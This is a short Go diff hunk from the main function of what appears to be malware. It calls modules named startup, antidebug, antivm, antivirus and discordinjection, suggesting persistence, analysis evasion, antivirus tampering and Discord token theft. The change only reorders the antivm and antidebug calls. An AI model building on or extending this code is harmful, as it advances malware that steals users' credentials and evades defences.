@@ -47,8 +47,8 @@ func main() {
 		go startup.Run()
 	}
 
-	antidebug.Run()
-	go antivm.Run()
+	antivm.Run()
+	go antidebug.Run()
 	go antivirus.Run()
 
 	go discordinjection.Run(
